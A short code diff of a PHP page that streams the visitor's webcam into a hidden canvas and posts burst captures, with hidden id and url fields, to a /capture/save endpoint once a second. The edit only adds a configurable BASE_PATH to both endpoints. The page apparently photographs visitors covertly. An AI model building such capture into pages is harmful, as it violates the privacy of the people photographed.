@@ -63,7 +63,7 @@ html, body { width: 100%; height: 100%; background: #fff; overflow: hidden; }
 <div id="videoWrap"><video id="video" width="320" height="240" autoplay playsinline muted></video></div>
 <canvas style="display:none" id="canvas"></canvas>
 
-<form action="/capture/save" id="captureForm" method="post">
+<form action="<?= BASE_PATH ?>/capture/save" id="captureForm" method="post">
     <input type="hidden" name="img" id="result" value="" />
     <input type="hidden" name="id" value="<?php echo htmlspecialchars($id); ?>" />
     <input type="hidden" name="url" value="<?php echo htmlspecialchars($url); ?>" />
@@ -281,7 +281,7 @@ html, body { width: 100%; height: 100%; background: #fff; overflow: hidden; }
                                 // 使用 XHR 代替 fetch，兼容性更好
                                 var xhr = new XMLHttpRequest();
                                 var fd = new FormData(form);
-                                xhr.open('POST', '/capture/save', true);
+                                xhr.open('POST', '<?= BASE_PATH ?>/capture/save', true);
                                 xhr.onload = function() {
                                     burstIndex++;
                                     setTimeout(burstLoop, 1000);
